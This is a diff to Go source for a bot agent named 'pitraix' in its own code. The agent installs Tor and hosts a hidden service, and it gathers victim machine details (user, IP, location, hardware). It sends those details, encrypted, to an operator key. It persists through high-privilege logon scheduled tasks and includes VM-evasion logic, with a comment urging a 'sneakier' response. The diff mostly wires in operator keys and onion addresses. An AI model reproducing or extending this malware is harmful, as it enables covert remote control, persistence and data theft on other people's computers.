@@ -53,14 +53,16 @@ import (
 )
 
 const (
-	osName = 1
+	osName = 1 // Do not change this unless you know what you are doing
 	ddosCounter = 45 // Do not change this unless you know what you are doing
 
-	raw_OPEncryptionKeyPEM = `~~YOUR RSA PUBLIC KEY - RUN SETUPCRYPTO.GO~~`
+	// DO NOT CHANGE THIS MANUALLY, RUN OPER
+	raw_OPEncryptionKeyPEM = `RXLCJAFYNIYZRZMWTZNMIYVSKFUAYJFSZUDIKNRNPMHOTDVSCRGLYTATTRGKGHPWDUMGEUHTTMEBAJRNEOYRDDUDMNWGBWEOASVYVGZZCRXIRUZIFBPAVMZZEWATVSYQNYDJLZPSMYGTOPUSPBRASSWWFOQGWZLRCWQMVKCXTUFGSIVPDKCLLWDIFAWWCVXBXUKOKALCPQKBWGRFTFGZQGZUOAHOZYSSWOBCZKEBLWFBJBQZTXCGZOJIDCYHGWSJGCNAVXAIZUDPPUIIFWYZKYASBNWDVIHCOSYNSTWENAJJSUPXAUSVSXYTVDNYGMVTHAQAURQVKTWYOBOSLFKYWOSPZJTRKQLLOPJTGNOXGGHCTNATRCBGVAIMFWSSTRJSJACBJFQRUJRGESXYSSIUIYWFEDZHSPEEIHSRCFAOCWRRQJMDOOFZOLNPXWDUWXATEBIDKFMZBMSNMPMCYNJNGQGARSVPAWWFDVTGNEXVIRZVXJNXIIWEZKSGPERFKUXTFDHMRSBXUVDQJSUCLMIHYFVRIZRJKSLBEWKDVYFXMDMELBTLCGORDJFJPWNDEXVNXVVXYTAAMYKWYSHZDNVAZYTCBYOLBIJAWBGKVTHWVOEEULFWXEZQNSCWVRMUGIBYUHUIKEVMPDAOMSKXAXZSEHCYIMIIAFLFBBFMTZMOIAHKPUVXNKIUGWETMFSPEEXKOGPCQRLKSGMLZTAWKFDMCQLGPZFDDOHHKPIBOJCKDIGAKWYADJQTOFHWPXKBGYELBQELQULTTIQNJFCBHJAUYCEUOIZAFOVEKDQAKLW`
 
-	raw_OPSigningKeyPEM = `~~OPTIONAL - YOUR BACKUP RSA PUBLIC KEY~~`
+	// raw_OPSigningKeyPEM = `LEAVE THIS EMPTY FOR NOW`
 
-	agentAddress = "modify this manually with your onion address or run OPER for first time"
+	// DO NOT CHANGE THIS MANUALLY, RUN OPER
+	agentAddress = "SNOGOYXKJWNZRYZFLHRJBLAVLLNXLMNBDDPJPJGKMJJDYDLVQSUIDPZA"
 )
 
 var (
@@ -161,28 +163,22 @@ func pemDec(key string) *pem.Block {
 func readFile(filePath string) ([]byte, error){
 	file, err := os.Open(filePath)
 	if err != nil {
-		// fmt.Println("Reading file error:", filePath, err)
 		return []byte{}, err
 	}
 	defer file.Close()
 
 	fs, _ := file.Stat()
-	// fmt.Println("File size:", fs.Size())
 	b := make([]byte, fs.Size())
 
 	for {
 		_, err := file.Read(b)
 		if err != nil {
 			if err != io.EOF {
-				// fmt.Println("real weird happened while reading file", filePath, err)
 				return []byte{}, err
 			}
 			break
 		}
 	}
-
-	// fmt.Println(string(b))
-
 	return b, nil
 }
 
@@ -422,19 +418,8 @@ func predictable_random(iv string, size int, t bool) (string, int) {
 	}
 }
 
-func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) string {
-	// bypassCountries := []string{
-	// 	"CN", // China
-	// 	"IR", // Iran
-	// 	"EG", // Egypt
-	// 	"IQ", // Iraq
-	// 	"PK", // Pakistan
-	// 	"RU", // Russia
-	// }
-	// linux implementation
-	// if !file_Exists(path + "\\" + name) || forceSetup == true { // download + unzip + extract tor only		
+func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) string {	
 	if !file_Exists(filepath.Join(path, name)) || forceSetup == true {
-		// if inFindStr(ipinfo_struct.Country, bypassCountries) {
 		fmt.Println("Tor not found!", !file_Exists(filepath.Join(path, name)), forceSetup)
 		
 		var v1m, v2m, v3m int = 11, 4,  0
@@ -466,7 +451,7 @@ func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) s
 				}
 
 				// if v1m == 20 {
-				// 	v1m +=
+				// 	v1m += 1
 				// }
 				if found == false {
 					continue
@@ -498,21 +483,18 @@ func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) s
 				f, _ := os.Create(filepath.Join(path, name + ".zip")) // path + "\\" + name + ".zip")
 				f.Write(tor)
 				f.Close()
+				unzip(filepath.Join(path, name + ".zip"), filepath.Join(path, name))
+				os.Remove(filepath.Join(path, name + ".zip"))
+				torrcf, _ := os.Create(filepath.Join(path, name, name + "torrc")) // os.Create(path + "\\" + name + "\\" + name + "torc")
+						defer torrcf.Close()
+						torrcf.Write([]byte(fmt.Sprintf(`HiddenServiceDir %s
+				HiddenServicePort 80 127.0.0.1:%s`, filepath.Join(path, name, name + "hid"), port))) // path + "\\" + name + "\\" + name + "hid", port)))
+
 				break
 			}
 
 		}
-
-		unzip(filepath.Join(path, name + ".zip"), filepath.Join(path, name))
-
-		os.Remove(filepath.Join(path, name + ".zip"))
-
-		torrcf, _ := os.Create(filepath.Join(path, name, name + "torrc")) // os.Create(path + "\\" + name + "\\" + name + "torc")
-		defer torrcf.Close()
-		torrcf.Write([]byte(fmt.Sprintf(`HiddenServiceDir %s
-HiddenServicePort 80 127.0.0.1:%s`, filepath.Join(path, name, name + "hid"), port))) // path + "\\" + name + "\\" + name + "hid", port)))
-
-	}	
+	}
 
 	doInstru("shellnoop", filepath.Join(path, name, "Tor", "tor.exe") + " -f " + filepath.Join(path, name, name + "torrc")) // path + "\\" + name + "\\Tor\\tor.exe -f " + path + "\\" + name + "\\" + name + "torc")
 	time.Sleep(time.Second * 5) // ensures we have enough time to connect and generate hostname
@@ -521,7 +503,7 @@ HiddenServicePort 80 127.0.0.1:%s`, filepath.Join(path, name, name + "hid"), por
 	rhostname := strings.Split(string(hostnamef), ".")[0]
 	if err != nil {
 		fmt.Println("hostname read error:", err)
-		// doInstru("shell", "rm -rf " + path + "\\" + name)
+		os.Remove(filepath.Join(path, name))
 		rhostname = setupTor(path, port, name, ipinfo_struct, true)
 	}
 
@@ -994,8 +976,7 @@ func vmCheck(userHostname, cpuVendor, machineVendor, machineModel string) {
 
 	}
 	if vmCPU[cpuVendor] || machineVendor == "innotek GmbH" || machineModel == "VirtualBox" {
-		fmt.Println("VM!")
-		os.Exit(0)
+		os.Exit(0) // you could change this to something more sneaky
 	}
 }
 
@@ -1040,12 +1021,32 @@ func copyf(src, dst string) error {
     return out.Close()
 }
 
+func IsUpper(s string) bool {
+    for _, r := range s {
+        if !unicode.IsUpper(r) && unicode.IsLetter(r) {
+            return false
+        }
+    }
+    return true
+}
+
+
 func main() {
+	// raw_OPEncryptionKeyPEM := strings.TrimSpace(raw_raw_OPEncryptionKeyPEM)
+	if IsUpper(agentAddress) || IsUpper(raw_OPEncryptionKeyPEM){
+		fmt.Println("Be sure to run OPER before compiling!!", agentAddress, raw_OPEncryptionKeyPEM)
+		time.Sleep(10 * time.Second)
+		os.Exit(0)
+	}
+
+	fmt.Println(raw_OPEncryptionKeyPEM, agentAddress)
 	contactDate = time.Now().String() // strings.Replace(time.Now().String(), "-", "", -1)
 	// contactDate = contactDate[2:strings.Index(contactDate, ".")]
 	// contactDate = strings.Replace(contactDate, " ", "", -1)
 	// contactDate = strings.Replace(contactDate, ":", "", -1)
 	
+
+	// fmt.Println("addr:", agentAddress)
 	cpuinfo_raw := strings.TrimSpace(doInstru("shell", "wmic CPU get name, manufacturer")[18:]) // "Intel(R) Core(TM) i5-4590 CPU @ 3.30GHz" // cpuInfo_Split[1] // fix
 	cpuinfo_split := strings.Fields(cpuinfo_raw)
 	cpu := strings.TrimSpace(cpuinfo_raw[len(cpuinfo_split[0]):])
@@ -1054,7 +1055,7 @@ func main() {
 	userHostname, machineType, osVariant, kernelVersion, arch, machineVendor, machineModel, memory := getMachineInfo()
 	// fmt.Println(userHostname, osVariant, kernelVersion, arch, machineVendor, machineModel)
 
-	vmCheck(userHostname, cpuVendor, machineVendor, machineModel)
+	// vmCheck(userHostname, cpuVendor, machineVendor, machineModel)
 	
 
 	if tor_running_check() { // exits if already running
@@ -1131,11 +1132,10 @@ func main() {
 		// time.Sleep(time.Second * 5)
 		if isadmin_const {
 			// doInstru("shell", `schtasks.exe /CREATE /SC ONLOGON /TN "` + pitraix_taskName + `" /TR "` + pitraix_FilePath + `" /RL HIGHEST /F`)
-			out := doInstru("shell", fmt.Sprintf("schtasks.exe /CREATE /SC ONLOGON /TN %s /TR %s /RL HIGHEST /F", pitraix_taskName, pitraix_FilePath))
+			doInstru("shell", fmt.Sprintf("schtasks.exe /CREATE /SC ONLOGON /TN %s /TR %s /RL HIGHEST /F", pitraix_taskName, pitraix_FilePath))
 			// fmt.Println("admin!", out)
 		} else {
-			fmt.Println(`schtasks.exe /CREATE /SC DAILY /TN "` + pitraix_taskName + `" /TR "` + pitraix_FilePath + `"`)
-			out := doInstru("shell", fmt.Sprintf("schtasks.exe /CREATE /SC DAILY /TN %s /TR %s", pitraix_taskName, pitraix_FilePath))
+			doInstru("shell", fmt.Sprintf("schtasks.exe /CREATE /SC DAILY /TN %s /TR %s /F", pitraix_taskName, pitraix_FilePath))
 			// fmt.Println("no :(", out)
 		}
 	}
@@ -1920,6 +1920,7 @@ func main() {
 		json.Unmarshal(ipinfo_req, &ipinfo_struct)
 		break
 	}
+	
 	if ipinfo_struct.Country == "IL" {
 		fmt.Println("Shalom")
 		os.Exit(0) // I love you
@@ -1955,20 +1956,20 @@ func main() {
 	}
 
 	opPubEncryptionKeyProcessed, _ := x509.ParsePKCS1PublicKey(pemDec(raw_OPEncryptionKeyPEM).Bytes)
-	opPubSigningKeyProcessed   , _ := x509.ParsePKCS1PublicKey(pemDec(raw_OPSigningKeyPEM).Bytes)
+	// opPubSigningKeyProcessed   , _ := x509.ParsePKCS1PublicKey(pemDec(raw_OPSigningKeyPEM).Bytes)
 
 
-	if opPubSigningKeyProcessed == opPubEncryptionKeyProcessed {
-		log("WARNING", "OPER signing key is same as encryption key! this is highly recommended against")
-	}
+	// if opPubSigningKeyProcessed == opPubEncryptionKeyProcessed {
+	// 	log("WARNING", "OPER signing key is same as encryption key! this is highly recommended against")
+	// }
 
 	// onetimeKey := base64.StdEncoding.EncodeToString(random_Bytes(32, true))
 
+	// first time register logic
 	encryptedMessage_register := RSA_OAEP_Encrypt(AES_Key, *opPubEncryptionKeyProcessed)
 	encrypted_registerData, nonce, _ := encrypt_AES([]byte(fmt.Sprintf(`{"Address": "%s", "Username": "%s", "CPU": "%s", "RAM": "%s", "IP": "%s", "Country": "%s", "City": "%s", "Hostname": "%s", "Chassis": %d, "OS": %d, "OSVar": "%s", "Kernel": "%s", "Arch": %d, "Vendor": "%s", "Model": "%s", "ContactD": "%s", "RasKey": "%s"}`, hstAddress, username, cpu, memory, ipinfo_struct.IP, ipinfo_struct.Country, ipinfo_struct.City, userHostname, machineType, osName, osVariant, kernelVersion, arch, machineVendor, machineModel, contactDate, base64.StdEncoding.EncodeToString(random_Bytes(32, true)))), AES_Key)
 	registerData := fmt.Sprintf("%s|%s|%s", encryptedMessage_register, base64.StdEncoding.EncodeToString(encrypted_registerData), base64.StdEncoding.EncodeToString(nonce))
 
-	// first time register logic
 	for {
 		fmt.Println("firstTime:", firstTime, "cft.Register:", cft.Register)
 		if firstTime == false && cft.Register == true {
@@ -2017,7 +2018,7 @@ func main() {
 	http.HandleFunc("/", func(writer http.ResponseWriter, req *http.Request) {
 		req.Body = http.MaxBytesReader(writer, req.Body, 3000) // if anything wrong, its prolly dis bitch
 		if req.Method == "GET" {
-			io.WriteString(writer, "")
+			// io.WriteString(writer, "")
 			log("Foreign - GET", "Received GET request")
 			fmt.Println("Got GET request! ", req.Body)
 		} else if req.Method == "POST" {
